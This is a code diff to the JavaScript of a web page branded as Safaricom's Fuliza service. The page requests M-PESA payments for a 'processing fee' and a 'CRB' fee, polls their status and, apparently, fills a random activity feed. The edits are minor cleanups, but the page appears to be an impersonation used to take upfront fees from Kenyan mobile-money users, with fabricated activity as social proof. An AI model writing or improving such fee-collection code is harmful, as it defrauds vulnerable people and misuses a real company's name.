@@ -572,10 +572,6 @@
     ============================================================= -->
     <script>
         // ──────────────────────────────────────────────────────────────
-        // NO API BASE URL – using relative paths
-        // ──────────────────────────────────────────────────────────────
-
-        // ──────────────────────────────────────────────────────────────
         // DATA
         // ──────────────────────────────────────────────────────────────
         let appData = {
@@ -804,14 +800,13 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phone, amount, reference, description })
             });
-            // Read as text first to avoid double consumption
             const text = await response.text();
             let data;
-            try { data = JSON.parse(text); } catch (e) { /* not JSON */ }
+            try { data = JSON.parse(text); } catch (e) { data = null; }
             if (!response.ok) {
                 throw new Error(data?.error || data?.message || text || 'Request failed');
             }
-            if (!data) throw new Error('Invalid response');
+            if (!data) throw new Error('Invalid response from server');
             return data;
         }
 
@@ -819,7 +814,7 @@
             const response = await fetch(`/api/status?transactionId=${transactionId}`);
             const text = await response.text();
             let data;
-            try { data = JSON.parse(text); } catch (e) { /* not JSON */ }
+            try { data = JSON.parse(text); } catch (e) { data = null; }
             if (!response.ok) {
                 throw new Error(data?.error || data?.message || text || 'Status check failed');
             }
@@ -869,7 +864,6 @@
                 processingFeeTransactionId = result.transactionId;
                 console.log('✅ Processing Fee Transaction ID:', processingFeeTransactionId);
 
-                // Poll status
                 await pollTransactionStatus(processingFeeTransactionId, 'processing');
 
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
@@ -946,7 +940,6 @@
                 crbTransactionId = result.transactionId;
                 console.log('✅ CRB Transaction ID:', crbTransactionId);
 
-                // Poll status
                 await pollTransactionStatus(crbTransactionId, 'crb');
 
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
@@ -979,7 +972,7 @@
         function pollTransactionStatus(transactionId, type) {
             return new Promise((resolve, reject) => {
                 let attempts = 0;
-                const maxAttempts = 30; // 30 * 2s = 60 seconds
+                const maxAttempts = 30;
 
                 const interval = setInterval(async () => {
                     attempts++;
@@ -997,7 +990,6 @@
                             clearInterval(interval);
                             reject(new Error('Transaction timeout. Please check your M-PESA app.'));
                         }
-                        // Status is 'PENDING' or 'SENT' - continue polling
                     } catch (err) {
                         console.error('Polling error:', err);
                         clearInterval(interval);
@@ -1007,7 +999,7 @@
             });
         }
 
-        // ==================== FINAL PAGE (All Fees Cleared) ====================
+        // ==================== FINAL PAGE ====================
         function proceedToFinalPage() {
             const rawPhone = appData.phone.startsWith('0') ? appData.phone : '0' + appData.phone;
             document.getElementById('finalPhoneDisplay').textContent = rawPhone;
@@ -1033,7 +1025,7 @@
         }
 
         // ──────────────────────────────────────────────────────────────
-        // ATTACH ALL FUNCTIONS TO `window` SO `onclick` WORKS
+        // ATTACH ALL FUNCTIONS TO `window`
         // ──────────────────────────────────────────────────────────────
         window.startApplication = startApplication;
         window.showPage = showPage;
@@ -1088,7 +1080,7 @@
             if (step3Active || procActive || crbActive) { addRandomFeed(); }
         }, 10000);
 
-        console.log('🇰🇪 Fuliza Safaricom Kenya (Paylore via proxy) – relative paths');
+        console.log('🇰🇪 Fuliza Safaricom Kenya (Paylore via proxy)');
     </script>
 </body>
 </html>
